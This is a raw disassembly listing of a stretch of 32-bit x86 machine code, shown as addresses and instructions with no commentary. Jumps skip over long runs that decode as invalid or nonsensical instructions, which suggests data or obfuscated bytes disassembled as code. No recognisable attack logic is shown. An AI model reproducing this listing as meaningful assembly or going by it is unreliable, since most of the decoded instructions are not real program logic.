  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7b1
  40dd3d:	and    DWORD PTR ds:0x42a781,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a871,0x42a87d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	push   DWORD PTR [edi]
  40dd65:	mov    esp,0x78acd39c
  40dd6a:	js     0x40dda1
  40dd6c:	jle    0x40dde6
  40dd6e:	js     0x40dd98
  40dd70:	pop    edx
  40dd71:	std    
  40dd72:	js     0x40dd3f
  40dd74:	and    ch,dl
  40dd76:	or     bh,0x15
  40dd79:	inc    edx
  40dd7a:	inc    edi
  40dd7b:	pusha  
  40dd7c:	shr    DWORD PTR [ebp+0x12],0x1c
  40dd80:	cwde   
  40dd81:	sahf   
  40dd82:	cmp    ebp,ecx
  40dd84:	adc    BYTE PTR [ecx-0x7761f488],cl
  40dd8a:	mov    edi,0x9f5c5ede
  40dd8f:	push   ebp
  40dd90:	clc    
  40dd91:	push   edx
  40dd92:	xchg   edi,eax
  40dd93:	adc    BYTE PTR [ebp+0x49e92f70],bh
  40dd99:	inc    edx
  40dd9a:	popf   
  40dd9b:	arpl   WORD PTR [eax+0x1598dbdf],bx
  40dda1:	dec    eax
  40dda2:	sbb    BYTE PTR [ecx-0x2d886ecf],dl
  40dda8:	cmp    ch,BYTE PTR [eax+0x6]
  40ddab:	lods   al,BYTE PTR ds:[esi]
  40ddac:	ror    ebx,0x3b
  40ddaf:	je     0x40dd76
  40ddb1:	lea    esp,[ecx]
  40ddb3:	xchg   ebx,eax
  40ddb4:	inc    eax
  40ddb5:	push   ecx
  40ddb6:	inc    edi
  40ddb7:	xor    DWORD PTR [edx-0x43],esi
  40ddba:	sub    cl,dl
  40ddbc:	loope  0x40de23
  40ddbe:	retfw  0xdd87
  40ddc2:	push   ss
  40ddc3:	push   0x2f1f322
  40ddc8:	dec    esp
  40ddc9:	sti    
  40ddca:	rcl    BYTE PTR [ecx+0x135c195],0x76
  40ddd1:	pop    ecx
  40ddd2:	test   al,0x5
  40ddd4:	js     0x40de27
  40ddd6:	jnp    0x40ddb7
  40ddd8:	sahf   
  40ddd9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dddb:	pop    eax
  40dddc:	shr    DWORD PTR [ebp+0x25],0x68
  40dde0:	add    eax,0x361a3ae6
  40dde5:	dec    edx
  40dde6:	mov    gs,WORD PTR [eax+0x4dfae7c]
  40ddec:	xchg   ebp,eax
  40dded:	dec    esi
  40ddee:	inc    eax
  40ddef:	inc    BYTE PTR [ecx+ecx*1-0x65]
  40ddf3:	push   0xffffff87
  40ddf5:	mov    ah,0x11
  40ddf7:	jno    0x40de67
  40ddf9:	or     DWORD PTR [ebx-0xdfc3d0c],esi
  40ddff:	and    al,0x60
  40de01:	cwde   
  40de02:	or     edi,DWORD PTR [edx]
  40de04:	inc    eax
  40de05:	add    eax,ecx
  40de07:	and    BYTE PTR [edi+0x9],bl
  40de0a:	retf   
  40de0b:	pusha  
  40de0c:	pop    ds
  40de0d:	xchg   esp,eax
  40de0e:	xor    BYTE PTR [ebx+0x3543a87a],ch
  40de14:	pop    es
  40de15:	lea    ecx,[ecx-0x6c]
  40de18:	dec    edx
  40de19:	mov    eax,ds:0xbaae4c68
  40de1e:	ffree  st(3)
  40de20:	push   ss
  40de21:	mov    edx,ebx
  40de23:	mov    fs,WORD PTR [ebx]
  40de25:	lahf   
  40de26:	xor    dl,BYTE PTR [edi]
  40de28:	repnz sti 
  40de2a:	mov    al,ds:0xbe4de1ac
  40de2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de30:	lods   eax,DWORD PTR ds:[esi]
  40de31:	inc    edi
  40de32:	dec    eax
  40de33:	push   ss
  40de34:	(bad)  
  40de35:	ud2    
  40de37:	mov    al,ds:0x2c322d67
  40de3c:	and    dh,al
  40de3e:	cwde   
  40de3f:	inc    edx
  40de40:	sub    BYTE PTR [ebx+0x6f6d64c1],ch
  40de46:	jb     0x40de52
  40de48:	adc    ebp,DWORD PTR [ecx+0x61]
  40de4b:	pop    ds
  40de4c:	xor    eax,0x3282cc73
  40de51:	in     eax,0x2a
  40de53:	xchg   esp,eax
  40de54:	sub    esi,DWORD PTR [edi]
  40de56:	jbe    0x40ddd8
  40de58:	mov    dl,0xa6
  40de5a:	sbb    bl,dl
  40de5c:	inc    ebx
  40de5d:	popa   
  40de5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de5f:	hlt    
  40de60:	jmp    0x41b7c392
  40de65:	add    DWORD PTR [edx],esp
  40de67:	xchg   ecx,eax
  40de68:	pop    ss
  40de69:	leave  
  40de6a:	aad    0xf9
  40de6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de6d:	and    al,0x3
  40de6f:	pop    ecx
  40de70:	xchg   esp,eax
  40de71:	pusha  
  40de72:	ins    BYTE PTR es:[edi],dx
  40de73:	ret    
  40de74:	dec    eax
  40de75:	ss jmp 0xfff6f148
  40de7b:	pop    esi
  40de7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de7d:	das    
  40de7e:	lods   al,BYTE PTR ds:[esi]
  40de7f:	inc    ecx
  40de80:	sub    eax,0xb7e05623
  40de85:	mov    al,0xd0
  40de87:	sbb    esp,DWORD PTR [ecx-0x47e2df84]
  40de8d:	xchg   ecx,eax
  40de8e:	in     al,0xea
  40de90:	mov    al,0x1
  40de92:	dec    edx
  40de93:	and    BYTE PTR [ebx-0x80],bh
  40de96:	cli    
  40de97:	nop
  40de98:	push   ebp
  40de99:	call   0x8094:0x4b21d13
  40dea0:	adc    ch,BYTE PTR [ebx+0x41cb3543]
  40dea6:	push   cs
  40dea7:	stos   BYTE PTR es:[edi],al
  40dea8:	jo     0x40df20
  40deaa:	dec    ebp
  40deab:	lock es in eax,dx
  40deae:	or     ebp,DWORD PTR [eax-0x49]
  40deb1:	xor    esi,DWORD PTR [eax-0x439326de]
  40deb7:	sbb    bl,bl
  40deb9:	test   al,0xa6
  40debb:	mov    ebx,0x86dc69a4
  40dec0:	pop    eax
  40dec1:	jno    0x40de92
  40dec3:	pop    eax
  40dec4:	(bad)  
  40dec5:	mov    esp,0x411899b2
  40deca:	shl    DWORD PTR [ebx-0x48],1
  40decd:	push   ebx
  40dece:	sbb    al,0x66
  40ded0:	fisub  WORD PTR [edi+0x10]
  40ded3:	loop   0x40df30
  40ded5:	mov    esp,DWORD PTR [edi]
  40ded7:	arpl   WORD PTR [esi],sp
  40ded9:	mov    edi,DWORD PTR [ebp+0x22]
  40dedc:	dec    ecx
  40dedd:	in     eax,0x61
  40dedf:	into   
  40dee0:	and    al,0xda
  40dee2:	nop
  40dee3:	inc    eax
  40dee4:	mov    BYTE PTR [ecx+edx*2],ah
  40dee7:	jnp    0x40df08
  40dee9:	pop    ds
  40deea:	(bad)  
  40deeb:	mov    ch,0xc2
  40deed:	fidiv  DWORD PTR [ebp+0x2f69e802]
  40def3:	sahf   
  40def4:	add    BYTE PTR [ebp+0x70],0x10
  40def8:	mov    ds:0x5cde65a,eax
  40defd:	mov    ebp,0x6a97fdef
  40df02:	test   BYTE PTR [edx+0x22],al
  40df05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df06:	inc    esi
  40df07:	ds pop ebp
  40df09:	cwde   
  40df0a:	and    ebx,DWORD PTR [edx]
  40df0c:	push   ss
  40df0d:	xchg   ecx,eax
  40df0e:	ins    DWORD PTR es:[edi],dx
  40df0f:	test   eax,0x86088af4
  40df14:	stc    
  40df15:	mov    ebp,0xaf07793e
  40df1a:	ja     0x40df82
  40df1c:	push   edx
  40df1d:	push   es
  40df1e:	add    DWORD PTR ss:[ebx],0xffffffbd
  40df22:	pop    ecx
  40df23:	addr16 pop ebx
  40df25:	stos   BYTE PTR es:[edi],al
  40df26:	mov    ds:0x42087351,eax
  40df2b:	pop    es
  40df2c:	scas   al,BYTE PTR es:[edi]
  40df2d:	push   edi
  40df2e:	push   esp
  40df2f:	scas   al,BYTE PTR es:[edi]
  40df30:	mov    WORD PTR [edx],gs
  40df32:	mov    bh,0x9b
  40df34:	mov    dh,0xca
  40df36:	mov    ds:0x3caf6a96,eax
  40df3b:	in     al,0x9b
  40df3d:	lock inc esi
  40df3f:	xor    eax,0x5c43155
  40df44:	bnd ret 0xe054
  40df48:	aam    0x30
  40df4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df4b:	stos   DWORD PTR es:[edi],eax
  40df4c:	xchg   esp,eax
  40df4d:	adc    BYTE PTR [ecx-0x4972ce71],0x98
  40df54:	in     eax,dx
  40df55:	jecxz  0x40deee
  40df57:	scas   eax,DWORD PTR es:[edi]
  40df58:	inc    ebx
  40df59:	jle    0x40df20
  40df5b:	call   0x43e27ca9
  40df60:	jae    0x40dfd2
  40df62:	push   ecx
  40df63:	xchg   ebx,eax
  40df64:	xchg   esp,eax
  40df65:	mov    esp,0xe74cb4fd
  40df6a:	out    0xbb,eax
  40df6c:	out    dx,eax
  40df6d:	push   edi
  40df6e:	adc    eax,0x1d483951
  40df73:	out    0x97,al
  40df75:	jne    0x40dfeb
  40df77:	sbb    edi,eax
  40df79:	stos   BYTE PTR es:[edi],al
  40df7a:	mov    cs,WORD PTR [edx-0x37]
  40df7d:	(bad)  
  40df7e:	mov    esp,0x3d065b23
  40df83:	dec    ecx
  40df84:	fist   DWORD PTR [eax+0x1ae3e431]
  40df8a:	and    DWORD PTR [ecx],0x4a672548
  40df90:	retf   0xd69a
  40df93:	scas   al,BYTE PTR es:[edi]
  40df94:	popf   
  40df95:	lods   eax,DWORD PTR ds:[esi]
  40df96:	in     eax,0x47
  40df98:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40df9a:	add    BYTE PTR [edi-0x4e],cl
  40df9d:	mov    cl,0x8f
  40df9f:	in     al,dx
  40dfa0:	cdq    
  40dfa1:	scas   al,BYTE PTR es:[edi]
  40dfa2:	(bad)  
  40dfa3:	les    edx,FWORD PTR [ebp-0x4e]
  40dfa6:	push   esp
  40dfa7:	jae    0x40df97
  40dfa9:	fs add eax,ebx
  40dfac:	mov    DWORD PTR [ebp-0x54],eax
  40dfaf:	not    DWORD PTR ds:0x42a839
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x7d40413a],1
  40dfde:	aas    
  40dfdf:	jns    0x40e058
  40dfe1:	mov    BYTE PTR [edx+0x7e357878],dh
  40dfe7:	js     0x40e061
  40dfe9:	retf   
  40dfea:	repz pop eax
  40dfec:	pop    edi
  40dfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfee:	mov    ecx,DWORD PTR [edi]
  40dff0:	and    ah,BYTE PTR [eax+0x2bc885af]
  40dff6:	outs   dx,DWORD PTR ds:[esi]
  40dff7:	inc    edx
  40dff8:	sbb    ecx,0xfe4af868
  40dffe:	xchg   ebp,ebp
  40e000:	pusha  
  40e001:	pop    ecx
  40e002:	jmp    0xa9a87462
  40e007:	es addr16 (bad) 
  40e00a:	enter  0x9704,0xb
  40e00e:	pop    ds
  40e00f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e010:	inc    esi
  40e011:	es ret 
  40e013:	add    bh,BYTE PTR [esi+eiz*2+0x329f50e0]
  40e01a:	mov    esi,0xf6f3b30e
  40e01f:	mov    esi,0xb7699b30
  40e024:	(bad)  
  40e025:	mov    eax,ds:0x7a81b5f8
  40e02a:	mov    cl,0x13
  40e02c:	xor    al,0xde
  40e02e:	lods   al,BYTE PTR ds:[esi]
  40e02f:	hlt    
  40e030:	sub    ebx,DWORD PTR [ecx]
  40e032:	shr    DWORD PTR [ebp+0x7641aa6],1
  40e038:	push   ecx
  40e039:	out    0xbf,eax
  40e03b:	sti    
  40e03c:	sub    al,0xfc
  40e03e:	cmc    
  40e03f:	shl    DWORD PTR [edi],0x77
  40e042:	arpl   WORD PTR [edi],ax
  40e044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e045:	xor    al,0x81
  40e047:	es loope 0x40e096
  40e04a:	push   esp
  40e04c:	add    cl,0xbe
  40e04f:	mov    edx,DWORD PTR [edx+0xb]
  40e052:	lahf   
  40e053:	xchg   ebx,eax
  40e054:	int    0x1c
  40e056:	mov    eax,0x9e4fbf4a
  40e05b:	xchg   esp,eax
  40e05c:	mov    eax,0x4ff5bd2
  40e061:	stc    
  40e062:	mov    eax,ds:0x498f6831
  40e067:	xor    BYTE PTR [esi+ecx*8],dh
  40e06a:	add    al,0xf8
  40e06c:	push   eax
  40e06d:	daa    
  40e06e:	sahf   
  40e06f:	nop
  40e070:	test   BYTE PTR [ecx-0x51],ah
  40e073:	push   ecx
  40e074:	dec    ebx
  40e075:	mov    eax,ds:0xb01c30b6
  40e07a:	sub    al,0x78
  40e07c:	dec    ebx
  40e07d:	inc    esp
  40e07e:	cli    
  40e07f:	sub    eax,0x7785f367
  40e084:	dec    edi
  40e085:	ret    
  40e086:	sbb    ebp,DWORD PTR [ebx-0x78]
  40e089:	addr16 jmp 0x9fe2:0x58e19673
  40e091:	push   0x4b1badc5
  40e096:	cmp    al,0xd1
  40e098:	dec    edi
  40e099:	and    edi,DWORD PTR [edx]
  40e09b:	or     eax,0xada9c221
  40e0a0:	mov    bh,0xc8
  40e0a2:	mov    ebx,0x7ac98852
  40e0a7:	imul   esi,DWORD PTR [esi+0x63],0x7fc3e58d
  40e0ae:	mov    ah,0xb0
  40e0b0:	in     eax,0x4d
  40e0b2:	jp     0x40e0ce
  40e0b4:	cmp    cl,dh
  40e0b6:	sti    
  40e0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0b8:	mov    ch,0xdd
  40e0ba:	in     al,0xab
  40e0bc:	(bad)  
  40e0bd:	in     eax,0xff
  40e0bf:	sahf   
  40e0c0:	mov    al,0x31
  40e0c2:	js     0x40e114
  40e0c4:	pop    esi
  40e0c5:	add    al,0x31
  40e0c7:	dec    ebx
  40e0c8:	getsec 
  40e0ca:	jb     0x40e12e
  40e0cc:	lahf   
  40e0cd:	call   0xb259:0x8c745b9
  40e0d4:	jl     0x40e134
  40e0d6:	jge    0x40e089
  40e0d8:	adc    DWORD PTR [ebp-0x81de2c1],eax
  40e0de:	sbb    BYTE PTR [edi-0x7a],ch
  40e0e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0e2:	cmp    ah,BYTE PTR [edx+ecx*4]
  40e0e5:	ret    
  40e0e6:	mov    dl,0x46
  40e0e8:	out    dx,al
  40e0e9:	addr16 mov edi,ebp
  40e0ec:	xchg   DWORD PTR gs:0xd209146d,esi
  40e0f3:	lds    edi,FWORD PTR [edi+ebp*4+0x1]
  40e0f7:	cli    
  40e0f8:	mov    bh,al
  40e0fa:	mov    edx,0x42b98909
  40e0ff:	ror    DWORD PTR [ebx-0x6361dd9e],1
  40e105:	les    ebx,FWORD PTR [ecx]
  40e107:	cmp    al,0x45
  40e109:	retf   0x1ab
  40e10c:	aad    0x43
  40e10e:	fcmovne st,st(1)
  40e110:	add    bl,BYTE PTR [edx+0x366ebe5]
  40e116:	jp     0x40e135
  40e118:	fistp  DWORD PTR [edx-0x1d]
  40e11b:	add    ebp,DWORD PTR [eax]
  40e11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e11e:	test   eax,0xe5c66e7f
  40e123:	xchg   edi,eax
  40e124:	das    
  40e125:	mov    eax,ds:0xc7aacb32
  40e12a:	pushf  
  40e12b:	adc    al,0x26
  40e12d:	fadd   st(2),st
  40e12f:	popa   
  40e130:	popa   
  40e131:	pop    ebp
  40e132:	jb     0x40e15b
  40e134:	mov    al,0xf3
  40e136:	retf   0xc867
  40e139:	icebp  
  40e13a:	rol    DWORD PTR [eax+0x7215349f],1
  40e140:	pusha  
  40e141:	repnz adc esi,eax
  40e144:	std    
  40e145:	lods   eax,DWORD PTR ds:[esi]
  40e146:	rol    BYTE PTR [esi-0x48],0x5c
  40e14a:	aad    0x30
  40e14c:	sub    al,0x95
  40e14e:	rcl    ch,cl
  40e150:	fsub   st(1),st
  40e152:	dec    ecx
  40e153:	mov    edx,0x5cfe625
  40e158:	xchg   esp,eax
  40e159:	or     ecx,DWORD PTR [ebp+0x6e]
  40e15c:	daa    
  40e15d:	aam    0x50
  40e15f:	cmp    al,0xcc
  40e161:	xchg   ebx,eax
  40e162:	rcl    DWORD PTR [edi+ebx*8-0x55],0xd6
  40e167:	sahf   
  40e168:	sub    ebp,DWORD PTR [ebp+esi*1+0x544958f4]
  40e16f:	jge    0x40e1b4
  40e171:	pop    edi
  40e172:	add    DWORD PTR [esi+0x5d8622c7],eax
  40e178:	ins    DWORD PTR es:[edi],dx
  40e179:	jno    0x40e114
  40e17b:	mov    dl,ah
  40e17d:	cmovb  edi,DWORD PTR [esi+ebx*8-0x36]
  40e182:	cs test eax,0x797d4b91
  40e188:	push   esp
  40e189:	xchg   ecx,eax
  40e18a:	(bad)  
  40e18b:	sub    dl,BYTE PTR [edx]
  40e18d:	out    dx,al
  40e18e:	mov    ch,0x60
  40e190:	fild   WORD PTR [edi-0x19]
  40e193:	push   edi
  40e194:	clc    
  40e195:	and    BYTE PTR [ebx],al
  40e197:	adc    al,0x2d
  40e199:	ficomp DWORD PTR [ebx-0x17]
  40e19c:	push   0x11
  40e19e:	mov    ds:0xf293d8da,al
  40e1a3:	push   cs
  40e1a4:	push   es
  40e1a5:	lahf   
  40e1a6:	sbb    DWORD PTR [ebp-0x2f44984d],edx
  40e1ac:	xchg   esp,eax
  40e1ad:	arpl   ax,cx
  40e1af:	mov    dh,0xbc
  40e1b1:	imul   ecx,DWORD PTR gs:[eax],0x2f
  40e1b5:	push   0x6e63fc59
  40e1ba:	ret    
  40e1bb:	push   edx
  40e1bc:	add    edi,DWORD PTR [ebp-0x80]
  40e1bf:	inc    edi
  40e1c0:	outs   dx,BYTE PTR ds:[esi]
  40e1c1:	cs pop esi
  40e1c3:	sti    
  40e1c4:	test   al,0x99
  40e1c6:	idiv   DWORD PTR [bp+di]
  40e1c9:	add    bl,al
  40e1cb:	test   DWORD PTR [esi+0x7d],0xccb8e1e8
  40e1d2:	ja     0x40e1b7
  40e1d4:	push   es
  40e1d5:	jl     0x40e24b
  40e1d7:	mov    edi,0x17a17ffb
  40e1dc:	pusha  
  40e1dd:	mov    bl,0x9
  40e1df:	add    DWORD PTR [bx+di+0x7b73],ebp
  40e1e4:	call   0x4faa654e
  40e1e9:	add    eax,DWORD PTR [edx]
  40e1eb:	in     al,dx
  40e1ec:	aam    0x93
  40e1ee:	sahf   
  40e1ef:	cdq    
  40e1f0:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40e1f2:	jmp    0xf1a4d8ae
  40e1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1f8:	fdivr  QWORD PTR [eax+0x70]
  40e1fb:	xchg   ebp,eax
  40e1fc:	cmp    al,BYTE PTR [ebx]
  40e1fe:	dec    esp
  40e1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e200:	mov    edx,0x4f7cd279
  40e205:	test   ebp,edx
  40e207:	push   0x1863123c
  40e20c:	or     ebx,esp
  40e20e:	fild   QWORD PTR [ebx+0x2e]
  40e211:	loopne 0x40e24f
  40e213:	add    DWORD PTR [esi],esp
  40e215:	lods   al,BYTE PTR ds:[esi]
  40e216:	mov    BYTE PTR [eax-0x7611c8ba],bh
  40e21c:	xchg   esp,eax
  40e21d:	iret   
  40e21e:	lock or dh,cl
  40e221:	and    eax,0xc63396af
  40e226:	add    eax,ebx
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	pop    edi
  40e23b:	imul   edx,DWORD PTR ds:0x78b0459c,0x78
  40e242:	xor    eax,0xa078787e
  40e247:	fnstsw WORD PTR [ebp+0x2b12187e]
  40e24d:	inc    esi
  40e24e:	arpl   sp,si
  40e250:	hlt    
  40e251:	xchg   ebx,eax
  40e252:	jns    0x40e2a5
  40e254:	outs   dx,DWORD PTR ds:[esi]
  40e255:	dec    ecx
  40e256:	sbb    ebx,DWORD PTR [esi+0x4033a1b4]
  40e25c:	jnp    0x40e297
  40e25e:	scas   al,BYTE PTR es:[edi]
  40e25f:	add    ah,0x6d
  40e262:	clc    
  40e263:	call   0xc629:0xbbefb2a
  40e26a:	mov    bh,0x52
  40e26c:	ss inc edi
  40e26e:	mov    edi,0xfa4de8d6
  40e273:	sti    
  40e274:	subps  xmm4,XMMWORD PTR [edx]
  40e277:	mov    eax,ds:0xe83f1b20
  40e27c:	scas   al,BYTE PTR es:[edi]
  40e27d:	test   eax,0xe40ae4e5
  40e282:	mov    gs,WORD PTR ds:0xaded3c24
  40e288:	or     al,0xc
  40e28a:	mov    al,0xcc
  40e28c:	popa   
  40e28d:	movaps xmm2,XMMWORD PTR [ebp-0x6]
  40e291:	xor    bh,dh
  40e293:	inc    ebx
  40e294:	stc    
  40e295:	xchg   ebx,eax
  40e296:	sar    DWORD PTR [esi-0x4aaf446],1
  40e29c:	inc    esi
  40e29d:	sub    DWORD PTR [eax],ecx
  40e29f:	jecxz  0x40e28b
  40e2a1:	xchg   esp,eax
  40e2a2:	mov    bl,0x95
  40e2a4:	dec    esi
  40e2a5:	mov    ds:0xe52538f5,al
  40e2aa:	dec    BYTE PTR [edx]
  40e2ac:	mov    DWORD PTR [ebx+eiz*4],edi
  40e2af:	outs   dx,DWORD PTR ds:[esi]
  40e2b0:	pop    esi
  40e2b1:	out    0x2d,al
  40e2b3:	mov    ebx,0xb950489a
  40e2b8:	bnd jg 0x40e262
  40e2bb:	bound  esi,QWORD PTR [esi]
  40e2bd:	mov    WORD PTR [eax],ds
  40e2bf:	mov    ch,dl
  40e2c1:	cmp    DWORD PTR [esi-0x2b],ecx
  40e2c4:	(bad)  
  40e2c6:	fcomp  DWORD PTR [ecx+eax*2-0x392b37f5]
  40e2cd:	retf   
  40e2ce:	mov    esp,0xc8a398e7
  40e2d3:	mov    ds:0xdbe3901c,eax
  40e2d8:	sub    al,0x49
  40e2da:	mov    ds:0xe77415a8,al
  40e2df:	fidiv  WORD PTR [esp+edi*8-0x53506e4f]
  40e2e6:	lods   eax,DWORD PTR ds:[esi]
  40e2e7:	imul   al
  40e2e9:	in     al,0xb8
  40e2eb:	pop    edi
  40e2ec:	jecxz  0x40e2dd
  40e2ee:	mov    edi,0x2e83a41c
  40e2f3:	pop    esp
  40e2f4:	or     esp,DWORD PTR [eax-0x27e7ffd4]
  40e2fa:	jp     0x40e33d
  40e2fc:	jns    0x40e374
  40e2fe:	and    eax,0x4e1700df
  40e303:	mov    ecx,es
  40e305:	scas   al,BYTE PTR es:[edi]
  40e306:	dec    edi
  40e307:	fdiv   DWORD PTR [ebp+ebp*4+0x44]
  40e30b:	pop    ebp
  40e30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e30d:	sahf   
  40e30e:	pop    edi
  40e30f:	cmp    ch,BYTE PTR [ebx+ebp*2]
  40e312:	cmp    ah,BYTE PTR [edx+0x0]
  40e315:	sbb    edx,DWORD PTR [edx]
  40e317:	inc    eax
  40e318:	icebp  
  40e319:	div    BYTE PTR [ecx-0x11]
  40e31c:	arpl   WORD PTR [edi-0x46098bbc],bx
  40e322:	std    
  40e323:	mov    edi,0x5ef34b4e
  40e328:	idiv   DWORD PTR [edx-0x43]
  40e32b:	push   ecx
  40e32c:	aad    0x37
  40e32e:	fbld   TBYTE PTR [ebp+0x300d4cdd]
  40e334:	fiadd  WORD PTR [bx+di]
  40e337:	addr16 (bad) 
  40e339:	and    eax,0xae507720
  40e33e:	rol    ebx,cl
  40e340:	js     0x40e307
  40e342:	ss inc ebx
  40e344:	pop    ebx
  40e345:	mov    ch,0x36
  40e347:	add    BYTE PTR [edi+0x57],0x35
  40e34b:	and    BYTE PTR [edi+0x14],0x5b
  40e34f:	loopne 0x40e3ae
  40e351:	retf   0x9e1b
  40e354:	xchg   esi,eax
  40e355:	(bad)  
  40e356:	popf   
  40e357:	ss ja  0x40e2da
  40e35a:	(bad)  
  40e35b:	adc    edx,edx
  40e35d:	shl    DWORD PTR [esi],0x8b
  40e360:	popf   
  40e361:	ins    BYTE PTR es:[edi],dx
  40e362:	into   
  40e363:	out    dx,eax
  40e364:	and    eax,0x3db0255
  40e369:	outs   dx,DWORD PTR ds:[esi]
  40e36a:	mov    edx,edi
  40e36c:	fucomip st,st(7)
  40e36e:	mov    ch,0x46
  40e370:	xchg   esp,eax
  40e371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e372:	ins    DWORD PTR es:[di],dx
  40e374:	add    dl,BYTE PTR [bp+0x6816]
  40e379:	cmp    eax,DWORD PTR [esi]
  40e37b:	aam    0xe
  40e37d:	(bad)  
  40e37e:	cld    
  40e37f:	gs jge 0x40e330
  40e382:	mov    esp,0xc9ab2564
  40e387:	rcl    BYTE PTR [ebp-0x62],0x5c
  40e38b:	cmp    DWORD PTR [ebp-0x67ccfcdd],0xf1b07c8a
  40e395:	xchg   ebx,eax
  40e396:	xchg   edx,eax
  40e397:	cmp    esp,eax
  40e399:	xchg   edx,eax
  40e39a:	mov    ds:0x71a3589a,al
  40e39f:	sbb    DWORD PTR [ebp-0x16cee206],ebx
  40e3a5:	mov    dh,0x99
  40e3a7:	inc    edx
  40e3a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3a9:	xchg   edi,eax
  40e3aa:	aam    0x3b
  40e3ac:	sbb    al,0x93
  40e3ae:	test   DWORD PTR ds:0xa1f9f59,esp
  40e3b4:	sub    al,0x68
  40e3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3b7:	lds    ebx,FWORD PTR [ecx+esi*8-0x2579f3ba]
  40e3be:	adc    al,0x4d
  40e3c0:	cld    
  40e3c1:	mov    ds:0x8b1a2713,eax
  40e3c6:	ret    0xdd95
  40e3c9:	cli    
  40e3ca:	push   esi
  40e3cb:	add    eax,0x325ee063
  40e3d0:	retf   
  40e3d1:	outs   dx,BYTE PTR ds:[esi]
  40e3d2:	(bad)  
  40e3d3:	outs   dx,BYTE PTR ds:[esi]
  40e3d4:	call   0x9256:0x1f8d6d13
  40e3db:	outs   dx,BYTE PTR ds:[esi]
  40e3dc:	jle    0x40e391
  40e3de:	mov    ah,0x59
  40e3e0:	iret   
  40e3e1:	jbe    0x40e372
  40e3e3:	push   ds
  40e3e4:	pusha  
  40e3e5:	ds je  0x40e392
  40e3e8:	ror    BYTE PTR [edx+edi*4-0x55],1
  40e3ec:	mov    dh,0xf1
  40e3ee:	sbb    BYTE PTR [ebx],ah
  40e3f0:	jmp    0xbeb12e7d
  40e3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f6:	sub    cl,BYTE PTR [esi-0x65]
  40e3f9:	loop   0x40e403
  40e3fb:	aam    0x62
  40e3fd:	ins    DWORD PTR es:[edi],dx
  40e3fe:	leave  
  40e3ff:	ret    0xe97e
  40e402:	inc    ecx
  40e403:	push   esi
  40e404:	inc    esp
  40e405:	mov    bh,bl
  40e407:	cmp    ah,BYTE PTR [ebx]
  40e409:	int3   
  40e40a:	sbb    bl,BYTE PTR [ebx-0x310b35c0]
  40e410:	jmp    0x80be082a
  40e415:	fdiv   st,st(4)
  40e417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e418:	in     eax,0xde
  40e41a:	lahf   
  40e41b:	lods   eax,DWORD PTR ds:[esi]
  40e41c:	or     dh,BYTE PTR [ebx]
  40e41e:	shl    DWORD PTR [ecx],1
  40e420:	mov    ax,0xf762
  40e424:	sub    eax,0xe7cd4df3
  40e429:	addr16 adc al,0x63
  40e42c:	test   DWORD PTR [edx+0x2c],eax
  40e42f:	ja     0x40e3f9
  40e431:	mov    bh,0x5e
  40e433:	inc    ecx
  40e434:	fstp   DWORD PTR [ecx+eiz*8+0x3]
  40e438:	adc    DWORD PTR [edx+esi*8+0x21],esi
  40e43c:	cld    
  40e43d:	imul   esi,DWORD PTR [ebp+ecx*4+0x6a],0xffffff8f
  40e442:	mov    dl,cl
  40e444:	pop    ss
  40e445:	push   ss
  40e446:	pop    esi
  40e447:	(bad)  
  40e448:	in     al,dx
  40e449:	pop    eax
  40e44a:	mov    ds:0xaddf7478,eax
